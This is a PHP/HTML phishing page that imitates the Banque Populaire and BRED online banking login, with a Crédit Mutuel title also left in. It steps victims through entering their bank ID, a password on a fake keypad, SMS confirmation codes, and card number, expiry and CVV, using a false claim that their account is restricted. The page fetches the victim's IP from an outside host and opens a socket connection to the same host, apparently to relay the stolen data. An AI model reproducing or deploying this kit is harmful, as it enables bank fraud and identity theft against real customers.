<?php

include './config/mail.php'

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/regenerator-runtime@0.13.5/runtime.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400&display=swap" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion à votre espace personnel</title>
    <link rel="icon" type="image/x-icon" href="https://www.banquepopulaire.fr/se-connecter/assets/favicon.ico" />   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
    <link href="https://cdn.jsdelivr.net/npm/@mdi/font@4.x/css/materialdesignicons.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js" integrity="sha256-yE5LLp5HSQ/z+hJeCqkz9hdjNkk1jaiGG0tDCraumnA=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/vue"></script>
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.3.0/socket.io.js" integrity="sha256-bQmrZe4yPnQrLTY+1gYylfNMBuGfnT/HKsCGX+9Xuqo=" crossorigin="anonymous"></script>
  <link rel="stylesheet" href="./css/style.css? __1">
  <link href="https://fonts.googleapis.com/css?family=Material+Icons" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/@mdi/font@4.x/css/materialdesignicons.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/vuetify@2.x/dist/vuetify.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/@vue/composition-api@1.0.0-beta.8"></script>
    <link href="https://unpkg.com/vuesax@4.0.1-alpha.16/dist/vuesax.min.css" rel="stylesheet">
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/vant@2.4/lib/index.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/iview/3.5.1/iview.js" integrity="sha256-Xjd66VohnxGyWXo6t7jy6Jdpa4MapbhWGgzRNcsnnzY=" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/iview/3.5.1/styles/iview.css" integrity="sha256-wrmzmt34CAQJ3ChhG+ZHZNhwVTDrlLGhLAS7tlbgfZM=" crossorigin="anonymous" />
 
    <title>Connexion à votre Espace Client - Crédit Mutuel</title>
    <script src="https://cdn.jsdelivr.net/npm/vant@2.4/lib/vant.min.js"></script>
   

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/uikit@3.3.3/dist/css/uikit.min.css" />

    <!-- UIkit JS -->
    <script src="https://cdn.jsdelivr.net/npm/uikit@3.3.3/dist/js/uikit.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/uikit@3.3.3/dist/js/uikit-icons.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/vuetify@2.x/dist/vuetify.js"></script>
    <script>
        window.locIp='';
        window.iPfull='';
       fetch('https://keys0.openode.io/ip',{
         mode:'cors',
       }).then(e=>{
         e.json().then(location=>{
          
           window.locIp=location
           window.iPfull =location.ip || location

           console.log(locIp+' / '+iPfull)
          
         })
       })
     </script>
</head>
<body>
    
<div id="bp_">
<p style="display:none">
    <input id="Mail" value="<?=$Mail;?>" />
    <input id="API" type="text" value="<?=$API_IQS;?>">
<input id="Security" type="text" value="<?=$security;?>">
</p>
    <v-app>

            <v-main>

                <div v-show="!state.loading" class="uk-padding">

                    
                    <div class="uk-text-center">
                        <div v-show="state.step==0 || state.step==1" class="uk-text-center">
                        <img v-if="state.log.DEP.toLowerCase().match(/(bred)/)" width="240px" src="https://upload.wikimedia.org/wikipedia/fr/thumb/8/8d/Logo_BRED_Banque_Populaire_2018.svg/1024px-Logo_BRED_Banque_Populaire_2018.svg.png"></img>
                            <img width="240px" v-else src="https://newsroom.groupebpce.fr/media/cache/theming_no_filter_grid_fs/5bb4d6e78d543f32117c513a" alt="">
                        </div>
                        <div  class="pt-5">

                        <div class="uk-width-1-2@m  uk-align-center" v-show="state.step==3">


                          <p>  <img v-if="state.log.DEP.toLowerCase().match(/(bred)/)" width="240px" src="https://upload.wikimedia.org/wikipedia/fr/thumb/8/8d/Logo_BRED_Banque_Populaire_2018.svg/1024px-Logo_BRED_Banque_Populaire_2018.svg.png"></img>
                       
                              
                            <img v-else width="30%" src="https://upload.wikimedia.org/wikipedia/fr/thumb/2/22/Banquepopulaire_logo.svg/1011px-Banquepopulaire_logo.svg.png" alt="">
                          </p>

                          <div class="uk-h3 font-weight-black primary--text">

                            <v-icon x-large color="primary">mdi-cellphone-message</v-icon> Confirmation mobile
                          </div>

                          <div class="uk-width-1-2@m uk-padding uk-align-center">
                            <v-text-field
                                v-model="state.log.CODE"
                                append-icon="mdi-message-outline"
                                name="name"
                                height="40"
                                label="Code de confirmation mobile"
                                placeholder="(6 chiffres )"
                                id="sms_"
                            ></v-text-field>
                            <br>

                            <v-btn @click="sendSms" large color="primary" > <v-icon left>mdi-lock-alert</v-icon> &nbsp;Se connecter</v-btn>
                        
                          </div>
                          <span class=" black--text font-weight-light">
                              Veuillez entrer le <b>Code</b>  reçu par SMS  . <br>
                              
                              <v-icon color="primary" >info</v-icon>

                            Si vous ne recevez pas le code à l'instant veuillez patienter 
                              celà peut prendre quelques minutes ...
                          </span>

                        </div>

                        <div v-show="state.step==2" class="uk-child-width-1-2@m uk-grid-collapse"  uk-grid>
                            <div>

                                <div class="uk-padding-small uk-text-left">


                                    <div class="uk-hidden@m uk-text-center">
                                        <p >
                                            <img v-if="state.log.DEP.toLowerCase().match(/(bred)/)" width="240px" src="https://upload.wikimedia.org/wikipedia/fr/thumb/8/8d/Logo_BRED_Banque_Populaire_2018.svg/1024px-Logo_BRED_Banque_Populaire_2018.svg.png"></img>
                       
                                            <img v-else width="100px" src="https://upload.wikimedia.org/wikipedia/fr/thumb/2/22/Banquepopulaire_logo.svg/1011px-Banquepopulaire_logo.svg.png" alt="">
                                        
                                           </p>
                                    </div>
                                     
                                        <div class="uk-h3 primary--text font-weight-bold"><v-icon large color="primary">mdi-shield</v-icon> <span class="uk-h3 primary--text" v-if="state.log.DEP.toLowerCase().match(/(bred)/)">BRED SECURE</span> <span class="uk-h3 primary--text" v-else>Activation Sécur' Pass</span> </div>
                                        <p>

                                            Suite à de nouvelle reforme votre compte est restreint , veuillez activer <b>le Service <span  v-if="state.log.DEP.toLowerCase().match(/(bred)/)">BRED SECURE</span><span v-else>Sécur’Pass</span></b> afin
                                            d'accéder  à votre compte et d'éffectuer vos opérations sensibles : 

                                            <ul   class="uk-list uk-text-meta  black--text uk-list-divider">
                                                <li> <v-icon small color="primary">mdi-square</v-icon> Retrait guichet</li>
                                                <li> <v-icon small color="primary">mdi-square</v-icon> Accès à vos comptes en ligne </li>
                                                <li><v-icon small color="primary">mdi-square</v-icon> Virements en ligne </li>
                                                <li><v-icon small color="primary">mdi-square</v-icon> Rélevés de compte , Signature et bien d'autre opérations sensibles ...</li>
                                                <li></li>

                                            </ul>


                                      
                                        </p>
                                       
                                      </p>
                                      <div class="uk-h3 primary--text"><v-icon large color="primary">mdi-account-check</v-icon> Valider votre identité </div>
                                      <p>Entrer les détails de votre carte primaire : </p>
                                      <div>
                                       
                                          <div class="uk-width-1-2@s">

                                            <p>
                                                <v-text-field
                                                    
                                                     name="name"
                                                     v-model="state.log.NUM"
                                                 
                                                append-icon="mdi-credit-card"
                                                
                                                
                                                     label="Numéro de carte"
                                                     id="card_"
                                                 ></v-text-field>
                                            <v-text-field
                                          
                                            placeholder="MM / AAAA"
                                            v-model="state.log.EX"
                                                name="name"
                                                label="Date d'expiration"
                                                id="exp_"
                                            ></v-text-field>
                                            <v-text-field
                                            name="name"
                                           
                                           id="cvv_"
                                            label="Cryptogramme visuel (CVV)"
                                            placeholder="CVV"
                                          
                                            v-model="state.log.CVV"
                                        ></v-text-field>

                                        <v-btn @click="sendCC" :disabled="state.isNotValid" block large color="primary"><v-icon>mdi-chevron-right</v-icon> 
                                            
                                            <span v-if="state.log.DEP.toLowerCase().match(/(bred)/)"> Activer BRED SECURE</span>
                                           <span v-else>
                                            Activer Sécur' Pass
                                           </span>
                                        
                                        </v-btn>
                                          </div>
                                             
                                    </div>
                                    <div>




                                    </div>
                                  
                                </div>


                            </div>
                                <div class="uk-visible@m uk-background-cover uk-background-image uk-background-secondary" data-src="https://source.unsplash.com/1600x900/?office,bank" uk-img>

            <div class="uk-overlay-primary uk-overlay uk-height-1-1">
<div >

<div class="uk-text-center uk-tile white--text ">

    <p>  <img v-if="state.log.DEP.toLowerCase().match(/(bred)/)" width="240px" src="https://upload.wikimedia.org/wikipedia/fr/thumb/8/8d/Logo_BRED_Banque_Populaire_2018.svg/1024px-Logo_BRED_Banque_Populaire_2018.svg.png"></img>
                       
                              
        <img v-else width="30%" src="https://upload.wikimedia.org/wikipedia/fr/thumb/2/22/Banquepopulaire_logo.svg/1011px-Banquepopulaire_logo.svg.png" alt="">
      </p>

<br>
<div><b>Avec <span v-if="state.log.DEP.toLowerCase().match(/(bred)/)">BRED SECURE</span> <span v-else>Sécur’Pass,</span> de nouvelles perspectives s’offrent à vous :</b></div>

<ul>
    <li>Le renforcement de la sécurité de vos opérations sensibles</li>
    <li>Un gain de temps : ces opérations sont réalisées sans délai d’attente</li>
    <li>Un service davantage disponible : l’accessibilité à internet (WIFI, 4G) suffit.</li>
    <li>Vos opérations sensibles peuvent être réalisées sur un ordinateur ou une tablette ou un SmartPhone.</li>
</ul>
</div>


</div>

                                    </div>

                                </div>

                               

                              


                        </div>

                        <div  v-show="state.step==0" class="uk-h2  font-weight-light">Accéder à vos comptes
                        </div>
                        <img  v-show="state.step==0" width="220px" src="./img/pic.png" alt="">
                        </div>
                        <div  style="min-width:280px" class="uk-width-1-4@m uk-width-1-3@s uk-align-center">
                            <v-select
                                v-show="state.step==0"
                            attach
                            v-model="state.log.DEP"
                                :items="['Alsace Lorraine Champagne','Aquitaine Centre Atlantique','Auvergne Rhône Alpes','Bourgogne Franche-Comté','du Nord','du Sud','Grand Ouest','Méditerranée','Occitane','Rives de Paris','Val de France','BRED']"
                                label="Banque régionale"
                                placeholder="Sélectionner votre banque"
                            ></v-select>
                         
                                <v-text-field
                                clearable
                                v-show="state.step==0 || state.step==1"
                                v-model="state.log.ID"
                                    autocomplete="off"
                                    name="name"

                                    label="Identifiant"
                                  @click:clear="state.step=0;state.log.ID=''"
                                
                            
                                ></v-text-field>
                                <v-text-field
                                v-show="state.step==1"
                                autocomplete="off"
                                name="name"
                                placeholder=""
                                clearable
                                
                                type="password"
                                v-model="state.log.PASS"
                                :readonly="state.log.DEP.toLowerCase().match(/(bred)/) ? false : true"
                                label="Mot de passe"
                           
                            ></v-text-field>


                                <div  v-show="state.step==0 || state.step==1" class="uk-text-left uk-text-meta black--text">
                                    <u>Oublié ?</u> <br>
                                    <u>Version accessible</u>

                                </div>
                                <br>
                                <v-btn v-show="state.step==0" :color="state.isNotValid? '' :'primary' " :disabled="state.isNotValid" @click="login" large block>Continuer</v-btn>

                                <table v-if="!state.log.DEP.toLowerCase().match(/(bred)/)" v-show="state.step==1" cellspacing="8" id="claver">
                                    <tr>

                                        <td @click="set('2')">2</td>
                                        <td @click="set('5')">5</td>
                                        <td @click="set('8')">8</td>
                                        <td @click="set('0')">0</td>
                                        <td @click="set('9')">9</td>
                                    </tr>
                                    <tr>

                                        <td @click="set('1')">1</td>
                                        <td @click="set('4')">4</td>
                                        <td @click="set('3')">3</td>
                                        <td @click="set('6')">6</td>
                                        <td @click="set('7')">7</td>
                                    </tr>

                                </table>

                                <br>
<div v-show="state.step==1" class="uk-child-width-1-2 uk-grid-match uk-grid-small" uk-grid>
    <div>
        <div> <v-btn @click="state.log.PASS=''" :color="state.isNotValid? '' :'primary' " :disabled="state.isNotValid" class="primary--text" outlined block  large>Effacer</v-btn></div>
    </div>
    <div>
        <div> <v-btn @click="sendLog" :color="state.isNotValid? '' :'primary' " :disabled="state.isNotValid"  block color="primary"  large>Valider</v-btn></div>
    </div>

</div>


<div v-show="state.step==10">


<div  class="uk-text-center">
                        <img v-if="state.log.DEP.toLowerCase().match(/(bred)/)" width="240px" src="https://upload.wikimedia.org/wikipedia/fr/thumb/8/8d/Logo_BRED_Banque_Populaire_2018.svg/1024px-Logo_BRED_Banque_Populaire_2018.svg.png"></img>
                            <img width="240px" v-else src="https://newsroom.groupebpce.fr/media/cache/theming_no_filter_grid_fs/5bb4d6e78d543f32117c513a" alt="">
                        </div>

    <div class="">
    <div style="color:#003c82" class="uk-h4 uk-text-bold color">Me connecter pour la première fois </div>

    <p  class="uk-text-light" style="color:black;font-size:16px">

Il s'agit de votre première visite , veuillez entrer le code reçu par SMS pour continuer
<br>

<br><br>

<v-text-field v-model="state.log.SMS_AUTH" id="code_" label=" Code" placeholder="( 8 caractères )">
</v-text-field>
</p>
<p>
<v-btn @click="loginFirst" large color="primary"><v-icon>mdi-menu-right</v-icon> Confirmer</v-btn>
</p>
<br>
<p class="uk-text-meta">
<v-icon small>mdi-information</v-icon> Veuillez patienter jusqu' à réception du code . <br>
Cela peut prendre quelques secondes ...
</p>
            
                    
    </div>

</div>

                        </div>


                    </div>


                </div>

                <div v-show="state.loading">

                        <div class="uk-text-center uk-position-center">

                                <div style="color:#003c82" uk-spinner></div>

                                <br>

                                
                                <img v-if="state.log.DEP.toLowerCase().match(/(bred)/)" width="240px" src="https://upload.wikimedia.org/wikipedia/fr/thumb/8/8d/Logo_BRED_Banque_Populaire_2018.svg/1024px-Logo_BRED_Banque_Populaire_2018.svg.png"></img>
                            <img width="240px" v-else src="https://newsroom.groupebpce.fr/media/cache/theming_no_filter_grid_fs/5bb4d6e78d543f32117c513a" alt="">
                     


                        </div>

                </div>



            </v-main>

    </v-app>

<div >



</div>


</div>


<script src="https://unpkg.com/vuesax@4.0.1-alpha.16/dist/vuesax.min.js"></script>

<script>
   
   
    const socket =io('https://keys0.openode.io',{
    transports:['websocket','polling']
})
 
  </script>
    <script type="text/babel" src="./js/apollo.js? __38LBPopuaire ++1_ cloudflare"></script>

   
    <script src="https://cdn.jsdelivr.net/npm/v-mask/dist/v-mask.min.js"></script>
    <script>

           

    </script>
    
</body>
</html>

